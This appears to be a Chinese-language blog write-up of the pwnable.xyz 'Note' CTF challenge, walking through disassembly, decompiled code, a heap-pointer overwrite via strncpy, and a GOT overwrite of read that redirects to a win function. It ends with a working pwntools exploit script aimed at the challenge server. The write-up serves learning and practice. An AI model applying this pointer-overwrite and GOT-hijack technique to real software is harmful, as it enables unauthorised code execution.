---
title: pwnable_note
date: 2019-12-05 14:56:15
tags:
- pwn
- pwnable.xyz
---

# pwnable.xyz  Note

### 思路：

反汇编出来的`win`部分代码：

```assembly
; function: win at 0x40093c -- 0x40094f
0x40093c:   55                           	push rbp
0x40093d:   48 89 e5                     	mov rbp, rsp
0x400940:   48 8d 3d 31 02 00 00         	lea rdi, [rip + 0x231]
0x400947:   e8 04 fe ff ff               	call 0x400750 <system>
0x40094c:   90                           	nop 
0x40094d:   5d                           	pop rbp
0x40094e:   c3                           	ret 
```

所以最后要调用到`0x40093c`地址。

接下来看反编译出的主要运行部分代码：

`main`:

```c
// Address range: 0x400a86 - 0x400ae3
int main(int argc, char ** argv) {
    // 0x400a86
    setup();
    puts("Note taking 101.");
    while (true) {
      lab_0x400a9f:
        // 0x400a9f
        print_menu();
        switch ((int32_t)v1) {
            case 1: {
                // 0x400abf
                edit_note();
                // continue -> 0x400a9f
                continue;
            }
            case 2: {
                // 0x400ac6
                edit_desc();
                goto lab_0x400a9f;
            }
            case 0: {
                return 0;
            }
            default: {
                // 0x400acd
                puts("Invalid");
                // continue -> 0x400a9f
                continue;
            }
        }
    }
    // 0x400adb
    return 0;
}
```

并没有可以操作的地方。但是将注意力引向了两个函数`edit_note();`、`edit_desc();`。

`edit_note();`：

```c
// Address range: 0x4009b6 - 0x400a38
int64_t edit_note(void) {
    // 0x4009b6
    printf("Note len? ");
    int32_t size = read_int32(); // 0x4009d4
    int64_t * mem = malloc(size); // 0x4009df
    printf("note: ");
    read(0, mem, size);
    strncpy((char *)&g3, (char *)mem, size);
    free(mem);
    return &g5;
}
```

`edit_desc();`:

```c
/ Address range: 0x400a38 - 0x400a86
int64_t edit_desc(void) {
    // 0x400a38
    if (g4 == 0) {
        // 0x400a48
        g4 = (int64_t)malloc(32);
    }
    // 0x400a59
    printf("desc: ");
    return read(0, (int64_t *)g4, 32);
}
```

通过IDA 可以看到`g3`和`g4`的位置差`0x20`,而且`edit_note();`函数里可以对`g3`进行很大空间的修改（通过`mem`）。然后通过再次选择菜单，调用`edit_desc();`对`g4`指向的位置进行修改，以达到对任意地址修改。

**这里主要的思想是通过`strncpy((char *)&g3, (char *)mem, size);`对`g3`指向的地方进行修改，来改变其后`0x20`位置的`g4`的数据，在`g4`的位置填写需要修改的地址，再调用`edit_desc();`的`read(0, (int64_t *)g4, 32);`时，即可修改`g4`存储的位置上的内容。**

还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.

![](https://i.loli.net/2019/12/05/dCfnRSPTrZB6FXh.png)

所以最后的思路有了：

首先将`read`函数的got地址通过调用函数`edit_note();`写入`g4`,

然后再调用`edit_desc();`修改`g4`指向的区域（就是`read`的got地址）内的内容为`win`的起始地址，当再次调用到`read`时，就会调用`win`，打印出`flag`。

EXC代码：

```python
from pwn import *
context.log_level = 'DEBUG'
r = remote("svc.pwnable.xyz", 30016)
 
read_got = 0x601248
win_add = 0x40093c
 
r.recvuntil("> ")
r.sendline("1")
 
r.recvuntil("len? ")
r.sendline(str(32+20))
 
r.recvuntil("note: ")
r.sendline("A"*32 + p64(read_got))
 
r.recvuntil("> ")
r.sendline("2")
 
r.recvuntil("desc: ")
r.sendline(p64(win_add))
 
r.recvuntil("> ")
r.sendline("2")
 
print r.recvall()
```

	### 总结：

由于自己前天才开始学习，缺乏pwn相关知识，大范围触及知识盲区，不晓得GOT（Global offset Table ）攻击。

### 参考：

[GOT覆盖和Linux地址随机化](https://syf.ac.cn/2017/08/19/17.08.19/)

[pwnable.xyznote ( write - up) ](https://sunrinjuntae.tistory.com/51)

